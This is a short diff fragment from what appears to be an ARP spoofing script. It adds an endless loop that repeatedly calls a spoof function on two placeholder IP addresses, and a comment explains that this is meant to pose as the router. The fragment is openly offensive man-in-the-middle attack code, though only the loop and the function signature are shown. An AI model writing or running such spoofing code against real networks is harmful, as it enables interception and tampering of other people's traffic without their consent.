@@ -17,4 +17,6 @@ def spoof(target_ip, spoof_ip):
 
 
 sent_packets_count = 0
-
+while True:
+    spoof("xx.xx.xx.xx", "xx.xx.xx.xx") #spoofs IP to pose as the router
+    spoof("xx.xx.xx.xx", "xx.xx.xx.xx")
